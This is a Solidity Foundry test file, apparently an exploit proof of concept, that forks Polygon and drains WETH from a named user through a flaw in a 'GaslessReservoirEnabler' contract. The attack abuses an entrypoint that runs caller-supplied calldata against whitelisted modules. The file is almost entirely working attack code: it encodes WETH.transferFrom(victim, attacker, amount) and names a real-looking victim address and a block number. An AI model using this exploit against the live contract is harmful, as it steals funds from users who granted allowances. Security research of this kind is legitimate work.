// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/ForkPoCBase.sol";

/// @dev Minimal view of WETH (polygon 0x7ceB...9f619).
interface IERC20Full {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @dev The victim contract's own ABI (structs + entrypoint we abuse).
interface IGaslessReservoirEnabler {
    struct ERC20Transfer {
        address token;
        uint256 amount;
    }
    struct ExecutionInfo {
        address module;
        bytes data;
        uint256 value;
    }

    function erc20WithTransfersAndExecute(
        ERC20Transfer[] calldata erc20sTransfers,
        ExecutionInfo[] calldata executionInfos
    ) external;

    function moduleWhitelist(address) external view returns (bool);
}

/// @title  GaslessReservoirEnabler allowance-theft PoC
/// @notice `erc20WithTransfersAndExecute` lets ANY caller supply an arbitrary `data` payload that the
///         enabler executes against any *whitelisted module*. WETH is a whitelisted module. So an
///         unprivileged attacker can make the enabler (msg.sender = the enabler) call
///         `WETH.transferFrom(victim, attacker, amount)` for any `victim` that granted the enabler a
///         WETH allowance — draining that user's WETH. No transfer of the attacker's own funds is
///         needed (the erc20sTransfers array is left empty).
contract ExploitTest is ForkPoCBase {
    address constant ENABLER = 0x9B58fDAdc16E30fBA313E044bf9e88689C3F163e;
    address constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;

    // A real user who approved the enabler for WETH (max allowance) and still holds WETH at block 94199849.
    // Discovered on-chain via WETH Approval logs filtered by spender == enabler.
    address constant VICTIM = 0x2F785EF4f514F6b785Ab93062e05CfCC937faC96;

    function setUp() public {
        forkAt("polygon", 94199849);
    }

    function testExploit() public {
        // Sanity: WETH really is a whitelisted module, and the victim really has approved the enabler.
        assertTrue(IGaslessReservoirEnabler(ENABLER).moduleWhitelist(WETH), "WETH not whitelisted");
        assertGt(IERC20Full(WETH).allowance(VICTIM, ENABLER), 0, "victim has no allowance to enabler");
        assertGt(IERC20Full(WETH).balanceOf(VICTIM), 0, "victim holds no WETH");

        proveTokenProfit(WETH, this.attack);
    }

    /// @notice Runs as the unprivileged `attacker`. Drains the victim's WETH through the enabler.
    function attack() external {
        vm.startPrank(attacker);

        uint256 drain = IERC20Full(WETH).balanceOf(VICTIM);
        uint256 allow = IERC20Full(WETH).allowance(VICTIM, ENABLER);
        if (allow < drain) drain = allow;

        // Empty transfers array => the enabler pulls nothing from the attacker.
        IGaslessReservoirEnabler.ERC20Transfer[] memory noTransfers =
            new IGaslessReservoirEnabler.ERC20Transfer[](0);

        // One execution: make the enabler call WETH.transferFrom(victim, attacker, drain).
        IGaslessReservoirEnabler.ExecutionInfo[] memory execs =
            new IGaslessReservoirEnabler.ExecutionInfo[](1);
        execs[0] = IGaslessReservoirEnabler.ExecutionInfo({
            module: WETH,
            data: abi.encodeWithSelector(IERC20Full.transferFrom.selector, VICTIM, attacker, drain),
            value: 0
        });

        IGaslessReservoirEnabler(ENABLER).erc20WithTransfersAndExecute(noTransfers, execs);

        vm.stopPrank();
    }
}
